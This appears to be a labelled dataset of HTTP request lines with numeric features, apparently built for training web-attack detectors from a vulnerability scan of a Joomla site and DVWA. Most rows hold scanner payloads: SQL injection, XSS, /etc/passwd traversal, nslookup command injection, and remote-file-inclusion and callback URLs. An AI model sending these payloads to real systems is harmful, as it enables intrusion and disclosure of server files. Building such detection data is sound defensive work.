48,1,404,523,7,27,3,7,1,GET ///www.vulnweb.com/component/users/ HTTP/1.1
72,1,404,3988,7,45,6,6,1,GET /index.php/component/content/category/1*1*1*2-uncategorised HTTP/1.1
68,1,404,3995,9,17,12,5,1,GET /index.php/-1%20OR%203%2b805-805-1=0%2b0%2b0%2b1/users/ HTTP/1.1
129,4,200,3185,13,94,12,5,1,GET /index.php/component/search/?searchword=the&ordering=category&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=newsfeeds HTTP/1.1
83,3,200,1721,9,53,9,5,0,GET /index.php/component/mailto/?link=JyI=&template=beez_20&tmpl=component HTTP/1.1
86,1,500,2101,7,56,10,5,1,GET /index.php/component/users/?view=;print(md5(acunetix_wvs_security_test)); HTTP/1.1
44,1,404,3995,7,16,6,5,1,GET /index.php/%f0''%f0\"\"/search/ HTTP/1.1
28,1,404,505,7,9,3,2,1,GET /backup-192.sql HTTP/1.1
95,3,200,3104,7,61,12,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=%f0''%f0\"\"&searchword= HTTP/1.1
117,1,404,3990,9,52,18,7,1,GET /index.php/component/-1%20OR%203%2b554-554-1=0%2b0%2b0%2b1%20--%20/article/2-uncategorised/1-testsayfasi HTTP/1.1
130,3,500,2115,15,78,16,5,1,GET /index.php/component/content/?format=feed&type=rss&view=%E5%98%8A%E5%98%8DSomeCustomInjectedHeader:%20injected_by_wvs HTTP/1.1
69,1,200,2750,8,29,16,5,0,POST /index.php/component/users/?task=!(()%26%26!%7c*%7c*%7c HTTP/1.1
146,3,200,3121,7,79,32,12,1,GET /index.php/component/search/?ordering=alpha&searchphrase=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&searchword= HTTP/1.1
31,1,404,507,13,6,3,4,1,GET //WEB-INF/web.xml~ HTTP/1.1
86,1,302,384,13,21,18,3,1,GET /DVWA/security.php?phpids=-1\"%20OR%202%2b418-418-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
81,3,500,2059,12,49,9,5,1,GET /index.php/component/content/?format=feed&type=rss&view=b2JXMTkya1I= HTTP/1.1
117,3,200,1735,13,65,13,5,0,GET /index.php/component/mailto/?link=acux7014%C0%BEz1%C0%BCz2a%90bcxuca7014&template=beez_20&tmpl=component HTTP/1.1
99,3,200,3155,7,73,8,7,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=/etc/passwd HTTP/1.1
41,1,302,390,11,19,1,5,1,GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1
95,3,200,1524,7,65,11,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=1-testsayfasi&print=1&tmpl=component HTTP/1.1
56,1,200,3307,7,36,4,5,0,GET /index.php/component/content/?view=featured HTTP/1.1
72,1,404,543,10,31,13,5,1,GET /r2foTWNt'));select%20pg_sleep(3);%20--%20/component/users/ HTTP/1.1
152,1,200,3250,7,88,36,8,0,GET /index.php/component/content/article/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd-uncategorised/1-testsayfasi HTTP/1.1
88,3,200,3105,7,62,10,5,0,GET /index.php/component/search/?ordering[]=newest&searchphrase=any&searchword= HTTP/1.1
92,3,200,3153,7,62,8,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=910729 HTTP/1.1
85,1,302,384,13,21,19,3,1,GET /DVWA/security.php?phpids=-1'%20OR%202%2b794-794-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
56,1,200,1985,7,33,2,6,0,GET /templates/beez_20/images/nature/arrow1.gif HTTP/1.1
102,3,200,3115,13,68,11,5,0,GET /index.php/component/search/?ordering=category&searchphrase=WEB-INF%5cweb.xml&searchword= HTTP/1.1
48,1,302,384,11,19,4,3,0,GET /DVWA/security.php?phpids=on9660639 HTTP/1.1
147,4,200,3278,7,102,16,5,0,GET /index.php/component/search/?searchword=ul.menuu0022onmouseover=kzsy(9660)u0022&ordering=category&searchphrase=any&areas[0]=categories HTTP/1.1
4175,3,200,3356,7,78,2049,2037,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././. HTTP/1.1
143,3,200,3228,7,73,38,21,1,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=../../../../../../../../../../../../../../../proc/version HTTP/1.1
103,1,500,2065,9,50,14,7,1,GET /index.php/component/content/-1%20OR%203*2<(0%2b5%2b172-172)/2-uncategorised/1-testsayfasi HTTP/1.1
24,1,404,502,7,9,2,2,1,GET /backup.zip HTTP/1.1
40,1,404,517,7,22,2,5,1,GET /examples/jsp/snp/snoop.jsp HTTP/1.1
198,3,500,2177,7,120,46,7,1,GET /index.php/component/content/?format=(select(0)from(select(sleep(2)))v)/*'%2b(select(0)from(select(sleep(2)))v)%2b'\"%2b(select(0)from(select(sleep(2)))v)%2b\"*/&type=atom&view=featured HTTP/1.1
87,1,200,2802,8,56,10,5,1,POST /index.php/component/users/?task=;print(md5(acunetix_wvs_security_test)); HTTP/1.1
73,1,500,2067,7,45,3,6,1,GET /index.php/component/content/category9505255/2-uncategorised HTTP/1.1
100,1,301,737,11,32,33,20,1,GET /DVWA/vulnerabilities/fi?page=../../../../../../../../../../../../../../../proc/version HTTP/1.1
117,1,200,3259,9,57,18,7,0,GET /index.php/component/content/article/-1%20OR%203*2<(0%2b5%2b763-763)%20--%20-uncategorised/1-testsayfasi HTTP/1.1
45,1,302,384,15,18,4,3,0,GET /DVWA/security.php?test=B6AYsLud HTTP/1.1
91,1,404,586,9,52,11,5,1,GET /index.php<video><source%20onerror=\"javascript:JIfz(9227)\">/component/users/ HTTP/1.1
139,4,200,3272,7,98,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9596)\"&ordering=newest&searchphrase=any&areas[0]=categories HTTP/1.1
89,3,200,3137,9,62,9,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=JyI= HTTP/1.1
87,1,404,562,8,55,9,8,1,GET /http://testasp.vulnweb.com/t/fit.txt%3F.php/2-uncategorised/1-testsayfasi HTTP/1.1
132,3,200,3264,9,78,21,5,1,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=joBZq9n6';%20waitfor%20delay%20'0:0:9'%20--%20 HTTP/1.1
97,1,200,3244,7,66,6,7,0,GET /index.php/component/content/article/%252fetc%252fpasswd-uncategorised/1-testsayfasi HTTP/1.1
104,3,500,2087,7,69,16,8,1,GET /index.php/component/content/?format=feed&type=atom&view=[url=http://www.vulnweb.com][/url] HTTP/1.1
28,1,404,505,7,9,2,2,1,GET /192_backup.tar HTTP/1.1
123,4,200,3196,7,85,15,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9819)&ordering=alpha&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
104,1,200,2794,20,40,14,5,1,POST /index.php/component/users/?task=remind.remind\"%20AND%202*3*8=6*8%20AND%20\"PTFr\"=\"PTFr HTTP/1.1
157,4,200,3286,23,87,22,5,0,GET /index.php/component/search/?searchword=acu3395%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca3395&ordering=popular&searchphrase=any&areas[0]=categories HTTP/1.1
129,5,200,3205,7,85,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9778)=&ordering=oldest&searchphrase=all&areas[0]=contacts HTTP/1.1
120,3,200,3128,9,63,18,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=-1%20OR%202%2b869-869-1=0%2b0%2b0%2b1&searchword= HTTP/1.1
86,2,500,2049,9,26,20,2,1,GET /index.php?format=-1%20OR%202%2b444-444-1=0%2b0%2b0%2b1%20--%20&type=atom HTTP/1.1
87,3,200,3160,7,62,8,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=1 HTTP/1.1
47,1,404,3995,13,20,4,6,1,GET /index.php/WEB-INF/web.xml/search/ HTTP/1.1
110,3,500,1983,8,77,12,9,1,GET /index.php/component/content/?format=feed&type=Http://testasp.vulnweb.com/t/fit.txt&view=featured HTTP/1.1
93,1,200,3287,7,35,25,13,1,GET /index.php/2-/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/1-testsayfasi HTTP/1.1
127,4,200,3183,13,92,12,5,1,GET /index.php/component/search/?searchword=the&ordering=alpha&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=categories HTTP/1.1
75,1,404,3994,7,49,4,10,1,GET /index.php/file:///etc/passwd/content/category/2-uncategorised HTTP/1.1
120,4,200,3142,13,81,12,5,1,GET /index.php/component/search/?searchword=&ordering=alpha&searchphrase=exact&areas[0]=acxScRiPtkzsy9362ScRiPt HTTP/1.1
25,1,404,502,7,10,1,3,1,GET /statystyka/ HTTP/1.1
58,1,200,2761,10,29,6,5,0,POST /index.php/component/users/?task=%40%40EnBdz HTTP/1.1
77,1,302,384,14,32,15,3,1,GET /DVWA/security.php?test=MbSc4Pmg');select%20pg_sleep(4);%20--%20 HTTP/1.1
29,1,302,384,11,9,2,3,0,GET /DVWA/logout.php HTTP/1.1
100,1,400,485,7,33,28,22,1,GET //.././.././.././.././.././.././.././../etc/./passwd%2500/2-uncategorised/1-testsayfasi HTTP/1.1
110,3,500,2087,12,62,19,5,1,GET /index.php/component/content/?format=feed&type=atom&view=VRvUBjlU');select%20pg_sleep(6);%20--%20 HTTP/1.1
159,4,200,3323,13,102,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9310))'bad=\"&ordering=oldest&searchphrase=any&areas[0]=categories HTTP/1.1
61,1,200,1111,7,39,2,5,1,GET /templates/beez_20/javascript/md_stylechanger.js HTTP/1.1
123,3,500,2109,7,83,15,9,1,GET /index.php/component/content/?format=http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg&type=atom&view=featured HTTP/1.1
67,1,400,485,7,12,27,17,1,GET /sdk/../../../../../../../../../../../../../etc/passwd HTTP/1.1
103,3,200,1524,7,57,22,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=!(()%26%26!%7c*%7c*%7c&tmpl=component HTTP/1.1
59,1,200,3287,7,19,5,4,1,GET /index.php/2-{{9999546*9999712}}/1-testsayfasi HTTP/1.1
93,1,404,567,7,57,10,8,1,GET /http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/2-uncategorised/1-testsayfasi HTTP/1.1
83,1,200,237,9,53,8,9,0,POST /index.php/component/users/?task=Http://testasp.vulnweb.com/t/fit.txt HTTP/1.1
123,2,500,1983,7,31,54,27,1,GET /index.php?format=feed&type=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd HTTP/1.1
130,4,200,3158,13,91,12,5,1,GET /index.php/component/search/?searchword=&ordering=alpha&searchphrase=exact&areas[0]=categoriesacxScRiPtkzsy9658ScRiPt HTTP/1.1
104,3,200,3167,13,70,10,7,0,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=/WEB-INF/web.xml HTTP/1.1
155,4,200,3291,23,85,22,5,0,GET /index.php/component/search/?searchword=acu5999%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca5999&ordering=oldest&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
91,3,200,3144,7,63,12,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=any&searchword=<!-- HTTP/1.1
149,1,302,384,24,34,40,4,1,GET /DVWA/security.php?test=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.name)%253C/script%253E HTTP/1.1
95,3,200,3153,7,63,8,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=19459683 HTTP/1.1
100,1,200,3305,19,36,13,4,1,GET /index.php/2-%26nslookup%20A90TQOGX%26'%5c\"`0%26nslookup%20A90TQOGX%26`'/1-testsayfasi HTTP/1.1
95,1,500,2077,8,48,17,5,1,GET /index.php/component/users/?view=login<svg%09%0a%0b%0c%0d%a0%00onload=Uqla(9664);> HTTP/1.1
111,1,500,2069,9,50,18,7,1,GET /index.php/component/content/-1%20OR%203*2>(0%2b5%2b708-708)%20--%20/2-uncategorised/1-testsayfasi HTTP/1.1
95,1,500,2071,7,49,14,6,1,GET /index.php/component/content/1%20waitfor%20delay%20'0:0:2'%20--%20/2-uncategorised HTTP/1.1
126,3,200,3271,7,92,14,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=;print(md5(acunetix_wvs_security_test)); HTTP/1.1
137,4,200,3263,7,96,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9320)\"&ordering=popular&searchphrase=all&areas[0]=content HTTP/1.1
39,1,200,312,7,19,1,5,0,GET /templates/beez_20/images/ HTTP/1.1
86,3,200,3105,7,62,8,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword= HTTP/1.1
122,1,200,3470,7,32,72,6,0,GET /index.php/component/content/category/2-))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))) HTTP/1.1
119,3,200,338,9,49,25,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=1&tmpl=-1'%20OR%203%2b547-547-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
101,1,200,3304,9,48,14,7,0,GET /index.php/-1%20OR%203*2>(0%2b5%2b658-658)/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
62,2,500,2045,7,24,18,2,1,GET /index.php?format=!(()%26%26!%7c*%7c*%7c&type=rss HTTP/1.1
153,4,200,3283,23,83,22,5,0,GET /index.php/component/search/?searchword=acu6241%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca6241&ordering=oldest&searchphrase=all&areas[0]=content HTTP/1.1
103,3,200,3172,13,69,10,7,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=/WEB-INF/web.xml HTTP/1.1
89,1,200,3240,7,64,4,9,1,GET /index.php/component/content/article//etc/passwd-uncategorised/1-testsayfasi HTTP/1.1
114,3,200,3134,14,76,11,8,1,GET /index.php/component/search/?ordering=category&searchphrase=http://hitW3VbHVIQeE.bxss.me/&searchword= HTTP/1.1
56,1,200,2755,8,30,7,5,1,POST /index.php/component/users/?task=%bf'%bf\" HTTP/1.1
129,3,200,3266,7,95,10,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=1some_inexistent_file_with_long_name%00.jpg HTTP/1.1
87,3,200,3111,7,63,8,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword= HTTP/1.1
39,1,404,516,7,22,3,3,1,GET /cgi-sys/entropybanner.cgi HTTP/1.1
84,1,404,536,7,26,23,22,1,GET //../..//../..//../..//../..//../..//etc/passwd%00.php/component/users/ HTTP/1.1
114,3,200,3085,7,64,15,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=1%00%c0%a7%c0%a2%252527%252522&searchword= HTTP/1.1
154,3,200,3126,7,89,40,6,0,GET /index.php/component/search/?ordering=..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd&searchphrase=all&searchword= HTTP/1.1
128,3,200,3130,7,94,10,5,0,GET /index.php/component/search/?ordering=category&searchphrase=1some_inexistent_file_with_long_name%00.jpg&searchword= HTTP/1.1
94,3,200,3097,7,67,10,6,0,GET /index.php/component/search/?ordering=newest&searchphrase=index.php/.&searchword= HTTP/1.1
132,3,200,3154,17,71,22,6,1,GET /index.php/component/search/?ordering=newest&searchphrase=all'\"()%26%25<acx><ScRiPt%20>RBUT(9700)</ScRiPt>&searchword= HTTP/1.1
93,3,200,3118,7,62,8,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all9253449&searchword= HTTP/1.1
98,3,200,1524,7,65,12,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=1-testsayfasi%00&print=1&tmpl=component HTTP/1.1
104,3,200,3177,7,71,11,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9921)&ordering=alpha&searchphrase=any HTTP/1.1
21,1,404,498,7,0,1,2,1,GET /9099221 HTTP/1.1
74,3,500,2039,7,46,9,5,1,GET /index.php/component/content/?format=feed&type=atom&view=1'\" HTTP/1.1
48,1,200,3277,7,21,4,4,0,GET /index.php/2-uncategorised/1-993361 HTTP/1.1
84,1,404,547,7,25,24,22,1,GET /index.php//../..//../..//../..//../..//../..//etc/passwd%00.jpg/users/ HTTP/1.1
53,1,200,3267,7,32,4,4,0,GET /index.php/2-uncategorised/1-testsayfasi HTTP/1.1
77,1,404,3990,7,51,4,10,1,GET /index.php/component/file:///etc/passwd/category/2-uncategorised HTTP/1.1
178,3,200,3123,18,73,41,5,0,GET /index.php/component/search/?ordering=category&searchphrase=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&searchword= HTTP/1.1
105,3,200,3177,7,79,10,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=testasp.vulnweb.com HTTP/1.1
144,3,200,3213,7,73,24,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=12345'\"\\'\\\");|]*%00{%0d%0a<%00>%bf%27'\xf0\x9f\x92\xa9 HTTP/1.1
85,3,500,2045,7,51,12,5,1,GET /index.php/component/content/?format=%f0''%f0\"\"&type=rss&view=featured HTTP/1.1
89,1,200,3300,7,52,11,8,1,GET /index.php/2-http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg/1-testsayfasi HTTP/1.1
110,1,500,2091,17,47,12,6,1,GET /index.php/component/content/category\"%20AND%202*3*8=6*8%20AND%20\"9PiF\"=\"9PiF/2-uncategorised HTTP/1.1
120,3,200,3251,7,84,12,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9221)\"&ordering=popular&searchphrase=any HTTP/1.1
107,3,200,3112,7,64,20,5,0,GET /index.php/component/search/?ordering=category&searchphrase=!(()%26%26!%7c*%7c*%7c&searchword= HTTP/1.1
121,3,200,1523,7,66,23,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=-1;%20waitfor%20delay%20'0:0:4'%20--%20&print=1&tmpl=component HTTP/1.1
145,4,200,3277,8,90,24,5,1,GET /index.php/component/search/?searchword=ul.menu\"%20l5uf=kzsy([!%20!])%2077W=\"&ordering=newest&searchphrase=any&areas[0]=categories HTTP/1.1
51,1,200,237,8,26,8,5,0,POST /index.php/component/users/?task=<!-- HTTP/1.1
89,3,200,1525,7,54,10,4,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=19315294&tmpl=component HTTP/1.1
34,1,404,510,7,17,1,5,1,GET //en/account/register HTTP/1.1
74,3,500,2045,7,50,8,5,1,GET /index.php/component/content/?format=&type=atom&view=featured HTTP/1.1
100,1,404,585,13,50,14,5,1,GET /index.php%26lt;ScRiPt%26gt;nzRa(9828)%26lt;/sCripT%26gt;/2-uncategorised/1-testsayfasi HTTP/1.1
58,2,500,2069,13,29,9,2,1,GET /index.php?format=WEB-INF%5cweb.xml&type=atom HTTP/1.1
66,1,200,237,8,43,6,5,0,POST /index.php/component/users/?task=testasp.vulnweb.com HTTP/1.1
183,1,404,656,17,94,43,8,1,GET /if(now()=sysdate()%2csleep(6)%2c0)/*'XOR(if(now()=sysdate()%2csleep(6)%2c0))OR'\"XOR(if(now()=sysdate()%2csleep(6)%2c0))OR\"*//component/content/category/2-uncategorised HTTP/1.1
51,1,500,2043,7,26,7,5,1,GET /index.php/component/users/?view='\"() HTTP/1.1
63,1,404,540,7,28,5,5,1,GET /response.write(9480314*9217198)/component/search/ HTTP/1.1
111,3,200,1524,12,70,13,7,1,GET /index.php/2-uncategorised/1-testsayfasi?page=http://hitOsC8e8JdXR.bxss.me/&print=1&tmpl=component HTTP/1.1
13,1,400,300,7,0,1,1,0,GET  HTTP/1.1
23,1,404,499,7,8,1,3,1,GET //register HTTP/1.1
47,1,200,2734,8,26,4,5,0,POST /index.php/component/users/?task= HTTP/1.1
105,3,200,3175,7,79,10,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=testasp.vulnweb.com HTTP/1.1
126,3,200,1757,7,63,8,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e9837711&template=beez_20&tmpl=component HTTP/1.1
21,1,404,498,7,5,2,3,1,GET /.stats/ HTTP/1.1
67,1,404,548,9,35,8,5,1,GET /index.php<body%20onload=JIfz(9172)>/component/search/ HTTP/1.1
88,1,302,384,11,48,12,3,1,GET /DVWA/security.php?phpids=\";print(md5(acunetix_wvs_security_test));%24a=\" HTTP/1.1
90,3,200,3152,7,62,9,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=1'\" HTTP/1.1
66,1,200,2767,8,37,6,5,0,POST /index.php/component/users/?task=%252fetc%252fpasswd HTTP/1.1
97,1,500,2085,10,54,13,6,1,GET /index.php/component/content/iWntsKS5';select%20pg_sleep(2);%20--%20/2-uncategorised HTTP/1.1
137,4,200,3269,7,96,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9009)\"&ordering=oldest&searchphrase=any&areas[0]=weblinks HTTP/1.1
141,3,200,1854,10,86,11,8,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=http://hitQrIeds92mL.bxss.me/&tmpl=component HTTP/1.1
131,4,200,3189,13,95,13,5,1,GET /index.php/component/search/?searchword=ul.menu&ordering=popular&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=weblinks HTTP/1.1
81,3,500,2047,7,53,11,5,1,GET /index.php/component/content/?format=feed&type=rss&view[$acunetix]=1 HTTP/1.1
98,1,200,3300,9,50,17,4,1,GET /index.php/XGcirywa';%20waitfor%20delay%20'0:0:4'%20--%20-uncategorised/1-testsayfasi HTTP/1.1
103,1,500,2077,13,60,10,8,1,GET /index.php/component/content/category}body{acu:Expre/**/SSion(KmPG(9033))}/2-uncategorised HTTP/1.1
123,3,200,3101,12,74,20,5,1,GET /index.php/component/search/?ordering=alpha&searchphrase=yCArCHyN'));select%20pg_sleep(8);%20--%20&searchword= HTTP/1.1
158,4,200,3327,13,101,24,7,1,GET /index.php/component/search/?searchword=ul.menu\"sTYLe='acu:Expre/**/SSion(kzsy(9970))'bad=\"&ordering=oldest&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
74,3,500,2041,7,46,12,5,1,GET /index.php/component/content/?format=feed&type=atom&view=<!-- HTTP/1.1
125,5,200,3197,7,82,20,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9422)=&ordering=category&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
119,3,200,1752,7,63,8,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=component HTTP/1.1
53,1,302,384,11,28,6,4,0,GET /DVWA/security.php?test=/www.vulnweb.com HTTP/1.1
127,3,500,1983,7,62,30,22,1,GET /index.php/component/content/?format=feed&type=/../..//../..//../..//../..//../..//etc/passwd%00.jpg&view=featured HTTP/1.1
41,1,302,390,11,20,1,5,0,GET /DVWA/vulnerabilities/brute/ HTTP/1.1
4129,1,302,384,11,34,2045,2035,1,GET /DVWA/instructions.php?doc=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././. HTTP/1.1
122,4,200,3149,13,83,12,5,1,GET /index.php/component/search/?searchword=&ordering=popular&searchphrase=exact&areas[0]=acxScRiPtkzsy9758ScRiPt HTTP/1.1
77,2,500,2101,8,49,10,6,1,GET /index.php?format=Http://testasp.vulnweb.com/t/fit.txt&type=atom HTTP/1.1
58,1,500,2051,7,34,6,5,1,GET /index.php/component/users/?view=index.php%00 HTTP/1.1
